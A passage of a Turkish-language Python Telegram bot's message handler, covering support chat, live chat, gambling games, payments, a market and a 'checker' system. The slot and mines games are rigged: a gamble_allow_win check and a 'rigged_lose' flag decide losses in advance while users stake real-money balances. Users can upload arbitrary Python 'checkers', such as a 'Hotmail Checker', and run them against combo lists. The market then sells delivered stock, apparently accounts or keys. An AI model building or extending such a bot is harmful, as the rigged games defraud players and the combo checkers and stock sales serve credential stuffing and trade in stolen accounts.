        bot.send_message(chat_id, "❌ Geçersiz miktar. Sayısal bir değer girin:")
    return


  if state == "admin_support_chat":
    if message.text:
      if message.text.strip().lower() in ("/iptal", "iptal", "/cancel"):
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, "🚪 Admin destek sohbetinden çıktınız.")
        return
      if user_id in admin_ids_set:
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, "👑 Admin hesabı destek hattına mesaj gönderemez.")
        return
      txt = message.text.strip()
      if is_support_spam_message(txt):
        w = int(support_warns.get(user_id, 0)) + 1
        support_warns[user_id] = w
        save_data()
        if w >= SUPPORT_WARN_LIMIT:
          uname = message.from_user.username
          uname_s = f"@{uname}" if uname else str(user_id)
          pending_hard_bans[user_id] = {
            "reason": "support_spam",
            "warns": w,
            "time": time.time(),
            "username": uname_s,
            "last_msg": txt[:200],
          }
          save_data()
          user_states.pop(chat_id, None)
          try:
            bot.send_message(
              chat_id,
              "⚠️ **Uyarı limiti doldu**\n\nBoş/spam destek nedeniyle hesabın süper ban **onayı için adminlere** iletildi.\nAdmin onaylarsa kalıcı süper ban uygulanır.",
              parse_mode="Markdown"
            )
          except Exception:
            pass
          for admin_id in admin_ids_set:
            if admin_id == user_id:
              continue
            try:
              am = types.InlineKeyboardMarkup(row_width=2)
              am.add(
                types.InlineKeyboardButton("✅ Süper Ban Onayla", callback_data=f"approve_hardban_{user_id}"),
                types.InlineKeyboardButton("❌ Reddet", callback_data=f"reject_hardban_{user_id}"),
              )
              bot.send_message(
                admin_id,
                f"🔒 **Süper Ban Onayı**\n\n👤 {uname_s}\n🆔 `{user_id}`\n⚠️ Uyarı: **{w}**\n💬 Son: `{txt[:150]}`\n\nOnaylarsan normal unban ile açılamayan ban uygulanır.",
                reply_markup=am,
                parse_mode="Markdown"
              )
            except Exception:
              pass
          return
        left = SUPPORT_WARN_LIMIT - w
        bot.send_message(
          chat_id,
          f"⚠️ **Uyarı {w}/{SUPPORT_WARN_LIMIT}**\n\nBoş veya anlamsız destek mesajı.\nKalan hak: **{left}** — sonra admin onayına düşer.",
          parse_mode="Markdown"
        )
        return
      uname = message.from_user.username
      uname_s = f"@{uname}" if uname else str(user_id)
      for admin_id in admin_ids_set:
        if admin_id == user_id:
          continue
        try:
          am = types.InlineKeyboardMarkup()
          am.add(types.InlineKeyboardButton("✉️ Yanıtla", callback_data=f"admin_reply_user_{user_id}"))
          bot.send_message(
            admin_id,
            f"🎧 **Destek mesajı**\n👤 {uname_s}\n🆔 `{user_id}`\n\n💬 {txt}",
            reply_markup=am,
            parse_mode="Markdown"
          )
        except Exception:
          pass
      try:
        bot.reply_to(message, "✅ Adminlere iletildi.")
      except Exception:
        pass
    else:
      bot.send_message(chat_id, "❌ Destek için anlamlı bir yazı gönderin.")
    return

  if state == "waiting_admin_support_reply":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    if message.text:
      target = admin_temp_data.get(chat_id, {}).get("reply_to_user")
      if not target:
        bot.send_message(chat_id, "❌ Hedef kullanıcı yok.")
        user_states.pop(chat_id, None)
        return
      try:
        bot.send_message(
          int(target),
          f"👑 **Admin yanıtı:**\n\n{message.text}",
          parse_mode="Markdown"
        )
        bot.send_message(chat_id, f"✅ `{target}` kullanıcısına iletildi.")
      except Exception as e:
        bot.send_message(chat_id, f"❌ İletilemedi: {e}")
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
    return

  if state == "active_live_chat":
    if message.text:
      txt = message.text
      if contains_blasphemy(txt):
        uname = message.from_user.username
        report_blasphemy_to_channel(user_id, uname, txt)
        try:
          bot.reply_to(message, "⚠️ Mesajın uygunsuz içerik nedeniyle moderasyona iletildi.")
        except:
          pass
        return
      if chat_id in live_chat_realname:
        disp = message.from_user.first_name or "Üye"
        if message.from_user.username:
          disp = f"{disp} (@{message.from_user.username})"
        prefix = f"💬 **{disp}:**"
      else:
        prefix = "💬 **Anonim Üye:**"
      for uid in list(active_live_chat_users):
        if uid != chat_id:
          try:
            bot.send_message(uid, f"{prefix} {txt}", parse_mode="Markdown")
          except:
            pass
      try:
        bot.reply_to(message, "✅ Mesajınız odaya iletildi.")
      except:
        pass
    return

  if state == "waiting_custom_area_name":
    if message.text:
      admin_temp_data[chat_id] = {'custom_area_name': message.text.strip()}
      user_states[chat_id] = "waiting_custom_area_desc"
      bot.send_message(chat_id, "📄 Şimdi bu yeni alanın içinde yazacak **açıklamayı/içeriği** gönderin:")
    return
  elif state == "waiting_custom_area_desc":
    if message.text:
      c_name = admin_temp_data.get(chat_id, {}).get('custom_area_name')
      c_desc = message.text.strip()
      c_id = str(uuid.uuid4())[:6]
      custom_member_categories[c_id] = {
        'name': c_name,
        'desc': c_desc
      }
      save_data()
      bot.send_message(chat_id, f"✅ Başarılı! '{c_name}' adında yeni alan üyeler için menüye eklendi.", parse_mode="Markdown")
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    return

  if state in ["waiting_tkm_bet", "waiting_yazitura_bet", "waiting_zeplin_bet", "waiting_mines_bet", "waiting_bonanza_bet", "waiting_dede_bet", "waiting_dice_bet"]:
    if message.text:
      if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, "❌ Oyun iptal edildi. Kumar menüsüne dönebilirsin.")
        return
      try:
        bet = float(message.text.replace(",", "."))
        if bet <= 0 or bet > get_gamble_bal(user_id):
          bot.send_message(chat_id, "❌ Geçersiz veya yetersiz **kumar bakiyesi**!\nTekrar bahis yaz veya /iptal", parse_mode="Markdown")
          return
        if MAX_GAMBLE_BET is not None and bet > MAX_GAMBLE_BET and user_id not in admin_ids_set:
          bot.send_message(chat_id, f"❌ Maksimum bahis: **{MAX_GAMBLE_BET:.0f} TL**", parse_mode="Markdown")
          return

        if state == "waiting_zeplin_bet":
          add_gamble_bal(user_id, -bet)
          add_to_jackpot(bet)
          save_data()
          threading.Thread(target=run_interactive_zeplin, args=(chat_id, user_id, bet)).start()
          user_states.pop(chat_id, None)
          return

        elif state == "waiting_mines_bet":
          add_gamble_bal(user_id, -bet)
          add_to_jackpot(bet)
          save_data()
          mine_positions = random.sample(range(9), MINES_COUNT)
          active_mines_games[user_id] = {
            'bet': bet,
            'mine_positions': mine_positions,
            'revealed': [],
            'game_over': False,
            'rigged_lose': not gamble_allow_win(user_id),
          }
          markup = types.InlineKeyboardMarkup(row_width=3)
          buttons = [types.InlineKeyboardButton("?", callback_data=f"mine_{i}") for i in range(9)]
          markup.add(*buttons)
          markup.add(types.InlineKeyboardButton("💰 Parayı Çek", callback_data="cash_out"))
          bot.send_message(
            chat_id,
            f"💣 **Mayın Tarlası (ZOR)**\n\nBahis: **{bet} TL**\n💣 Mayın: **{MINES_COUNT}/9**\n📈 Güvenli kutu: **+{MINES_MULT_PER_STEP}x**\n\nRisk yüksek!",
            reply_markup=markup,
            parse_mode="Markdown"
          )
          user_states.pop(chat_id, None)
          return

        elif state == "waiting_bonanza_bet":
          add_gamble_bal(user_id, -bet)
          add_to_jackpot(bet)
          semboller = ["🍭", "🍬", "🍫", "🍎", "🍇", "🍌", "⭐", "❌", "🍀", "💎"]
          allow_win = gamble_allow_win(user_id)
          if allow_win:
            sym = random.choice(semboller[:5])
            other = random.choice([s for s in semboller if s != sym])
            s1, s2, s3, s4 = sym, sym, sym, other
            mul = random.choice([1.4, 1.6, 1.8, 2.0, 2.2])
            kazanc = bet * mul
            add_gamble_bal(user_id, kazanc)
            update_gambling_profit(user_id, kazanc - bet)
            result_line = f"🎉 **Küçük kazanç!** ({mul}x) -> +{kazanc:.2f} TL"
          else:
            while True:
              s1, s2, s3, s4 = random.choice(semboller), random.choice(semboller), random.choice(semboller), random.choice(semboller)
              if not ((s1 == s2 == s3) or (s2 == s3 == s4)):
                break
            update_gambling_profit(user_id, -bet)
            result_line = f"😢 **Boş!** -{bet:.2f} TL"
          save_data()
          gbal_now = get_gamble_bal(user_id)
          bot.send_message(
            chat_id,
            f"🍬 **SWEET BONANZA**\n[{s1} | {s2} | {s3} | {s4}]\n{result_line}\n"
            f"💵 Kumar Bakiyesi: **{gbal_now:.2f} TL**\n\n"
            f"▶️ Yeni bahis yaz (TL) veya `/iptal`",
            parse_mode="Markdown"
          )
          return

        elif state == "waiting_dede_bet":
          add_gamble_bal(user_id, -bet)
          add_to_jackpot(bet)
          semboller = ["⚡", "👑", "💍", "🏆", "💎", "🔴", "🔵", "❌", "🍀", "⭐"]
          allow_win = gamble_allow_win(user_id)
          if allow_win:
            sym = random.choice(semboller[:5])
            other = random.choice([s for s in semboller if s != sym])
            s1, s2, s3, s4 = sym, sym, sym, other
            mul = random.choice([1.4, 1.6, 1.8, 2.0, 2.2])
            kazanc = bet * mul
            add_gamble_bal(user_id, kazanc)
            update_gambling_profit(user_id, kazanc - bet)
            result_line = f"⚡ **Küçük kazanç!** ({mul}x) -> +{kazanc:.2f} TL"
          else:
            while True:
              s1, s2, s3, s4 = random.choice(semboller), random.choice(semboller), random.choice(semboller), random.choice(semboller)
              if not ((s1 == s2 == s3) or (s2 == s3 == s4)):
                break
            update_gambling_profit(user_id, -bet)
            result_line = f"😢 **Boş!** -{bet:.2f} TL"
          save_data()
          gbal_now = get_gamble_bal(user_id)
          bot.send_message(
            chat_id,
            f"👴 **GATES OF OLYMPUS**\n[{s1} | {s2} | {s3} | {s4}]\n{result_line}\n"
            f"💳 Kumar Bakiyesi: **{gbal_now:.2f} TL**\n\n"
            f"▶️ Yeni bahis yaz (TL) veya `/iptal`",
            parse_mode="Markdown"
          )
          return

        elif state == "waiting_tkm_bet":
          admin_temp_data[chat_id] = {'tkm_bet': bet}
          markup = types.InlineKeyboardMarkup(row_width=3)
          markup.add(
            types.InlineKeyboardButton("🪨 Taş", callback_data="tkm_choice_tas"),
            types.InlineKeyboardButton("📄 Kağıt", callback_data="tkm_choice_kagit"),
            types.InlineKeyboardButton("✂️ Makas", callback_data="tkm_choice_makas")
          )
          bot.send_message(chat_id, f"✂️ Bahis: {bet} TL. Seçiminizi yapın:", reply_markup=markup)
          user_states.pop(chat_id, None)

        elif state == "waiting_yazitura_bet":
          admin_temp_data[chat_id] = {'yt_bet': bet}
          markup = types.InlineKeyboardMarkup(row_width=2)
          markup.add(
            types.InlineKeyboardButton("📄 Yazı", callback_data="yt_choice_yazi"),
            types.InlineKeyboardButton("🪙 Tura", callback_data="yt_choice_tura")
          )
          bot.send_message(chat_id, f"🪙 Bahis: {bet} TL. Tahmininizi yapın:", reply_markup=markup)
          user_states.pop(chat_id, None)

        elif state == "waiting_dice_bet":
          admin_temp_data[chat_id] = {'dice_bet': bet}
          markup = types.InlineKeyboardMarkup(row_width=2)
          markup.add(
            types.InlineKeyboardButton("⬇️ Düşük (1-3) x1.9", callback_data="dice_low"),
            types.InlineKeyboardButton("⬆️ Yüksek (4-6) x1.9", callback_data="dice_high"),
          )
          markup.add(
            types.InlineKeyboardButton("🎯 Tam 6 x5", callback_data="dice_exact_6"),
            types.InlineKeyboardButton("🎯 Tam 1 x5", callback_data="dice_exact_1"),
          )
          bot.send_message(
            chat_id,
            f"🎲 **Zar** — Bahis: **{bet} TL**\nSeçimini yap:",
            reply_markup=markup,
            parse_mode="Markdown"
          )
          user_states.pop(chat_id, None)

      except:
        bot.send_message(chat_id, "❌ Geçersiz bahis miktarı!")
    return

  if state == "waiting_vip_payment_proof":
    proof_text = message.text if message.text else "📸 Dekont Fotoğrafı Gönderildi"
    photo_id = message.photo[-1].file_id if message.photo else None

    bot.send_message(chat_id, "✅ Dekont alındı ve onay için yöneticilere iletildi.")
    user_states.pop(chat_id, None)

    admin_markup = types.InlineKeyboardMarkup(row_width=3)
    admin_markup.add(
      types.InlineKeyboardButton("✅ Onayla", callback_data=f"vip_approve_{user_id}"),
      types.InlineKeyboardButton("❌ Reddet", callback_data=f"vip_reject_{user_id}"),
      types.InlineKeyboardButton("🚫 Banla", callback_data=f"vip_ban_{user_id}")
    )
    for admin_id in admin_ids_set:
      try:
        caption = f"🚨 **YENİ VIP ÖDEME DEKONTU!**\n👤 Kullanıcı: `{user_id}`\n📄 Detay: {proof_text}"
        if photo_id:
          bot.send_photo(admin_id, photo_id, caption=caption, reply_markup=admin_markup, parse_mode="Markdown")
        else:
          bot.send_message(admin_id, caption, reply_markup=admin_markup, parse_mode="Markdown")
      except:
        pass
    return

  elif state == "waiting_star_claim_amount":
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel", "/cancel"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    try:
      claimed = int(str(message.text).strip().replace(",", "").replace(".", ""))
    except Exception:
      bot.send_message(chat_id, f"❌ Sayı yaz ({STAR_MIN}–{STAR_MAX}) veya /iptal")
      return
    if claimed < STAR_MIN or claimed > STAR_MAX:
      bot.send_message(chat_id, f"❌ {STAR_MIN}–{STAR_MAX} yıldız arası.")
      return
    user_states.pop(chat_id, None)
    try:
      open_claims = [
        v for v in pending_star_payments.values()
        if int(v.get("user_id") or 0) == int(user_id)
        and v.get("status") == "pending"
        and v.get("type") == "admin_claim"
      ]
      if len(open_claims) >= 2:
        bot.send_message(chat_id, "❌ Zaten bekleyen talebin var.")
        return
    except Exception:
      pass
    send_star_claim_invoice(chat_id, user_id, claimed)
    return

  elif state == "waiting_star_amount":
    if not message.text:
      bot.send_message(chat_id, "❌ Sayı yaz (kaç yıldız) veya /iptal")
      return
    if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal edildi.")
      return
    try:
      stars = int(message.text.strip().replace(",", "").replace(".", ""))
    except Exception:
      bot.send_message(chat_id, "❌ Geçerli bir sayı yaz (örn: 8)")
      return
    if stars < STAR_MIN or stars > STAR_MAX:
      bot.send_message(
        chat_id,
        f"❌ {STAR_MIN}–{STAR_MAX} arası olmalı.\n"
        f"💱 1⭐ = {STAR_TL_PER_STAR:.0f} TL",
        parse_mode="Markdown",
      )
      return
    user_states.pop(chat_id, None)
    send_star_invoice(chat_id, user_id, stars)
    return

  elif state == "waiting_star_gamble_amount":
    if not message.text:
      bot.send_message(chat_id, "❌ Sayı yaz (kaç yıldız) veya /iptal")
      return
    if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal edildi.")
      return
    try:
      stars = int(message.text.strip().replace(",", "").replace(".", ""))
    except Exception:
      bot.send_message(chat_id, "❌ Geçerli bir sayı yaz (örn: 100)")
      return
    if stars < STAR_GAMBLE_MIN or stars > STAR_GAMBLE_MAX:
      bot.send_message(
        chat_id,
        f"❌ {STAR_GAMBLE_MIN}–{STAR_GAMBLE_MAX} arası olmalı.\n"
        f"💱 100⭐ = 1000 kumar",
        parse_mode="Markdown",
      )
      return
    user_states.pop(chat_id, None)
    send_star_gamble_invoice(chat_id, user_id, stars)
    return

  elif state == "waiting_group_code":
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    code = (message.text or "").strip()
    if not code:
      bot.send_message(chat_id, "Kod yaz")
      return
    ok, res = claim_group_code(user_id, code)
    user_states.pop(chat_id, None)
    if ok:
      bot.send_message(chat_id, f"✅ Kod kabul! **+{float(res):.2f} TL**\\nBakiye: **{user_balances.get(user_id,0):.2f} TL**", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, f"❌ {res}")
    return

  elif state == "waiting_admin_group_code":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    parts = (message.text or "").split()
    if len(parts) < 2:
      bot.send_message(chat_id, "Format: `KOD ODUL [MAX] [not]`", parse_mode="Markdown")
      return
    code = parts[0]
    reward = parts[1]
    max_uses = parts[2] if len(parts) > 2 else 100
    note = " ".join(parts[3:]) if len(parts) > 3 else ""
    try:
      max_uses = int(max_uses)
    except Exception:
      max_uses = 100
    ok, res = create_group_code(code, reward, max_uses, note)
    user_states.pop(chat_id, None)
    if ok:
      bot.send_message(
        chat_id,
        f"✅ Kod hazır: `{res}`\\n"
        f"Gruba duyur: bu kodu botta **Aktiflik → Grup Kodu** ile girsinler.",
        parse_mode="Markdown",
      )
    else:
      bot.send_message(chat_id, f"❌ {res}")
    return

  elif state == "waiting_admin_py_file":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    try:
      if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel", "/cancel"):
        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)
        bot.send_message(chat_id, "❌ İptal.")
        return
      data = None
      fname = "admin_chk.py"
      if message.document:
        fname = message.document.file_name or "admin_chk.py"
        try:
          bot.send_message(chat_id, "⏳ Dosya alınıyor...")
        except Exception:
          pass
        try:
          fi = bot.get_file(message.document.file_id)
          raw = bot.download_file(fi.file_path)
          data = raw if isinstance(raw, (bytes, bytearray)) else str(raw).encode("utf-8", errors="ignore")
        except Exception as e:
          bot.send_message(chat_id, f"❌ İndirme hatası: {e}")
          return
      elif message.text and len(message.text.strip()) > 20:
        data = message.text.strip().encode("utf-8", errors="ignore")
        fname = "pasted_admin.py"
      else:
        bot.send_message(chat_id, "📎 `.py` gönder veya kodu yapıştır · /iptal")
        return
      admin_temp_data[chat_id] = {"admin_py_bytes": data, "admin_py_fname": fname}
      user_states[chat_id] = "waiting_admin_py_name"
      bot.send_message(
        chat_id,
        "✅ Dosya alındı.\\n📝 **Menüde görünecek adı yaz**\\n"
        "Örnek: `Hotmail Live`\\n"
        "İkinci satıra açıklama da yazabilirsin.\\n/iptal",
        parse_mode="Markdown",
      )
    except Exception as e:
      log_error("waiting_admin_py_file", e)
      bot.send_message(chat_id, f"❌ Hata: {e}")
    return

  elif state == "waiting_admin_py_name":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel", "/cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    raw = (message.text or "").strip()
    if not raw:
      bot.send_message(chat_id, "Menü adı yaz")
      return
    lines = raw.splitlines()
    menu_name = lines[0].strip()[:40]
    menu_desc = lines[1].strip()[:200] if len(lines) > 1 else ""
    meta = admin_temp_data.get(chat_id) or {}
    data = meta.get("admin_py_bytes")
    fname = meta.get("admin_py_fname") or "admin.py"
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    if not data:
      bot.send_message(chat_id, "❌ Dosya kayboldu, tekrar yükle.")
      return
    ok, res = submit_admin_custom_checker(user_id, data, fname, menu_name, menu_desc)
    if ok:
      bot.send_message(
        chat_id,
        f"✅ **Eklendi — menüde hazır**\\n"
        f"🆔 `{res}`\\n"
        f"📛 **{menu_name}**\\n\\n"
        f"Checker menüsünden herkes kullanabilir.",
        parse_mode="Markdown",
      )
    else:
      bot.send_message(chat_id, f"❌ Eklenemedi: {res}")
    return

  elif state == "waiting_custom_chk_py":
    try:
      if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel", "/cancel"):
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, "❌ İptal.")
        return
      data = None
      fname = "paste.py"
      if message.document:
        fname = (message.document.file_name or "chk.py")
        low = fname.lower()
        mime = (getattr(message.document, "mime_type", None) or "").lower()
        ok_ext = low.endswith((".py", ".txt", ".pyw")) or "python" in mime or "text" in mime
        if not ok_ext and low.endswith((".zip", ".rar", ".7z")):
          bot.send_message(chat_id, "❌ Arşiv değil, düz `.py` dosyası gönder.")
          return
        if not ok_ext:
          bot.send_message(chat_id, f"❌ `.py` (veya kod içeren .txt) gönder.\nGelen: `{fname}`", parse_mode="Markdown")
          return
        try:
          bot.send_message(chat_id, "⏳ Dosya alınıyor...")
        except Exception:
          pass
        try:
          fi = bot.get_file(message.document.file_id)
          raw = bot.download_file(fi.file_path)
          data = raw if isinstance(raw, (bytes, bytearray)) else str(raw).encode("utf-8", errors="ignore")
        except Exception as e:
          bot.send_message(chat_id, f"❌ Telegram indirme hatası: {e}")
          return
      elif message.text and len(message.text.strip()) > 30:
        data = message.text.strip().encode("utf-8", errors="ignore")
        fname = "pasted.py"
        try:
          bot.send_message(chat_id, "⏳ Kod alındı, kaydediliyor...")
        except Exception:
          pass
      else:
        bot.send_message(
          chat_id,
          "📎 `.py` dosyası gönder **veya** kodu yapıştır.\nİptal: /iptal",
          parse_mode="Markdown",
        )
        return
      if not data:
        bot.send_message(chat_id, "❌ Boş dosya.")
        return
      uname = (message.from_user.username if message.from_user else "") or ""
      try:
        ok, res = submit_custom_checker(user_id, uname, data, fname)
      except Exception as e:
        log_error("submit_custom_checker", e)
        bot.send_message(chat_id, f"❌ Kayıt hatası: {e}")
        return
      user_states.pop(chat_id, None)
      if not ok:
        bot.send_message(chat_id, f"❌ Yüklenemedi: {res}")
        return
      try:
        bot.send_message(
          chat_id,
          f"✅ Checker yüklendi\n"
          f"ID: {res}\n\n"
          f"Admin onayına gitti.\n"
          f"Test: Checker → PY Taleplerim → Test",
        )
      except Exception as e:
        try:
          bot.send_message(chat_id, f"Yuklendi ID={res} (bildirim hatasi: {e})")
        except Exception:
          pass
    except Exception as e:
      log_error("waiting_custom_chk_py", e)
      try:
        bot.send_message(chat_id, f"❌ Beklenmeyen hata: {e}")
      except Exception:
        pass
    return

  elif state == "waiting_cchk_menu_name":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ Onay iptal.")
      return
    raw = (message.text or "").strip()
    if not raw:
      bot.send_message(chat_id, "Menü adı yaz (ör. Hotmail Checker)")
      return
    lines = raw.splitlines()
    menu_name = lines[0].strip()[:40]
    menu_desc = lines[1].strip()[:200] if len(lines) > 1 else ""
    cid = (admin_temp_data.get(chat_id) or {}).get("cchk_approve_cid")
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    if not cid:
      bot.send_message(chat_id, "❌ Oturum yok, tekrar onayla.")
      return
    ok, msg = approve_custom_checker(cid, user_id, menu_name=menu_name, menu_desc=menu_desc)
    if ok:
      bot.send_message(chat_id, f"✅ Menüye eklendi: **{msg}**\nChecker menüsünde görünür.", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, f"❌ {msg}")
    return

  elif state == "waiting_cchk_rename":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    raw = (message.text or "").strip()
    if not raw:
      bot.send_message(chat_id, "Yeni ad yaz")
      return
    lines = raw.splitlines()
    new_name = lines[0].strip()[:40]
    new_desc = lines[1].strip()[:200] if len(lines) > 1 else None
    cid = (admin_temp_data.get(chat_id) or {}).get("cchk_rename_cid")
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    if not cid:
      bot.send_message(chat_id, "❌ Oturum yok")
      return
    ok, msg = rename_custom_checker(cid, new_name, new_desc)
    bot.send_message(chat_id, f"✅ Yeni ad: **{msg}**" if ok else f"❌ {msg}", parse_mode="Markdown")
    return

  elif state == "waiting_cchk_combo":
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    combo = None
    if message.document:
      try:
        fi = bot.get_file(message.document.file_id)
        raw = bot.download_file(fi.file_path)
        combo = raw.decode("utf-8", errors="ignore") if isinstance(raw, (bytes, bytearray)) else str(raw)
      except Exception as e:
        bot.send_message(chat_id, f"❌ {e}")
        return
    elif message.text:
      combo = message.text
    else:
      bot.send_message(chat_id, "❌ Combo metin veya .txt")
      return
    meta = admin_temp_data.get(chat_id) or {}
    cid = meta.get("cchk_id")
    priv = bool(meta.get("cchk_private"))
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    if not cid:
      bot.send_message(chat_id, "❌ Checker seçimi kayboldu.")
      return
    threading.Thread(
      target=run_custom_checker_job,
      args=(chat_id, user_id, cid, combo),
      kwargs={"private_only": priv},
      daemon=True,
    ).start()
    return

  elif state == "waiting_broadcast_preview":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    if message.text and message.text.strip().lower() in ("/iptal", "iptal"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    b_text = (message.text or message.caption or "").strip()
    if not b_text:
      bot.send_message(chat_id, "❌ Metin yaz.")
      return
    admin_temp_data[chat_id] = {"broadcast_preview": b_text}
    user_states.pop(chat_id, None)
    markup = types.InlineKeyboardMarkup()
    markup.add(
      types.InlineKeyboardButton("✅ Herkese gönder", callback_data="broadcast_send_confirm"),
      types.InlineKeyboardButton("❌ Vazgeç", callback_data="menu_admin"),
    )
    bot.send_message(
      chat_id,
      f"📢 **ÖNİZLEME (sadece sen)**\\n\\n{b_text}\\n\\n—\\nOnaylarsan tüm kullanıcılara gider.",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif state == "waiting_market_qty":
    if not message.text:
      bot.send_message(chat_id, "❌ Adet yaz (1–100) veya /iptal")
      return
    if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ Market alımı iptal edildi.")
      return
    try:
      qty = int(message.text.strip().replace(",", "").replace(".", ""))
    except Exception:
      bot.send_message(chat_id, f"❌ Geçerli sayı yaz (1–{MAX_MARKET_BUY_QTY})")
      return
    if qty < 1:
      bot.send_message(chat_id, "❌ En az 1 adet olmalı.")
      return
    if qty > int(MAX_MARKET_BUY_QTY):
      bot.send_message(chat_id, f"❌ Marketten tek seferde en fazla **{MAX_MARKET_BUY_QTY}** adet alabilirsin.", parse_mode="Markdown")
      return
    daily_left = market_daily_remaining(user_id)
    if qty > daily_left:
      bot.send_message(chat_id, f"❌ Günlük market limiti: kalan **{daily_left}** adet (max {MAX_MARKET_DAILY_QTY}/gün).", parse_mode="Markdown")
      return
    meta = admin_temp_data.get(chat_id) or {}
    item_key = meta.get("market_item_key")
    if not item_key or item_key not in market_data:
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ Ürün bilgisi kayboldu. Marketten tekrar seç.")
      return
    item = market_data[item_key]
    stock_file = item.get("stock_file")
    if not stock_file:
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ Stok dosyası yok.")
      return
    current_stocks = get_stock_list(stock_file)
    if len(current_stocks) <= 0:
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ Stok bitmiş!")
      return
    if qty > len(current_stocks):
      bot.send_message(chat_id, f"❌ Stokta sadece **{len(current_stocks)}** adet var.", parse_mode="Markdown")
      return
    price = float(item.get("price") or 0)
    disc = get_level_discount(user_id)
    unit_price = round(price * (1.0 - disc), 2)
    total_price = round(unit_price * qty, 2)
    bakiye = float(user_balances.get(user_id, 0.0) or 0.0)
    if bakiye < total_price:
      bot.send_message(chat_id, f"❌ Yetersiz bakiye! Gerekli: **{total_price:.2f} TL**", parse_mode="Markdown")
      return
    delivered = remove_n_stock(stock_file, qty)
    if not delivered:
      bot.send_message(chat_id, "❌ Stok alınamadı.")
      return
    actual_qty = len(delivered)
    total_price = round(unit_price * actual_qty, 2)
    user_balances[user_id] = bakiye - total_price
    add_balance_history(user_id, "market_buy", -total_price, f"{item.get('name', item_key)} x{actual_qty}")
    log_activity("market_buy", user_id, f"{item_key}x{actual_qty}:{total_price}")
    try:
      market_daily_add(user_id, actual_qty)
      check_stock_warn(stock_file, item.get("name", item_key))
    except Exception:
      pass
    save_data()
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    disc_txt = f"\n🏷️ Level indirimi: **%{int(disc*100)}**" if disc > 0 else ""
    content_block = "\n".join(delivered)
    header = (
      f"✅ **Market alımı başarılı!**\n"
      f"📦 {item.get('name', item_key)}\n"
      f"🔢 Adet: **{actual_qty}** (max {MAX_MARKET_BUY_QTY})\n"
      f"💵 Ödenen: **{total_price:.2f} TL**{disc_txt}\n"
      f"💳 Kalan: **{user_balances.get(user_id, 0):.2f} TL**\n\n🔑 İçerik:\n"
    )
    if len(header) + len(content_block) < 3500:
      bot.send_message(chat_id, header + "```text\n" + content_block + "\n```", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, header + f"_Dosya ({actual_qty} satır)_", parse_mode="Markdown")
      tmp = f"market_{user_id}_{item_key}.txt"
      try:
        with open(tmp, "w", encoding="utf-8") as f:
          f.write(content_block + "\n")
        with open(tmp, "rb") as doc:
          bot.send_document(chat_id, doc, caption=f"🛒 {item.get('name', item_key)} × {actual_qty}")
      finally:
        try:
          os.remove(tmp)
        except Exception:
          pass
    return

  elif state == "waiting_bot_rate_comment":
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "cancel", "/cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ Puanlama iptal edildi.")
      return
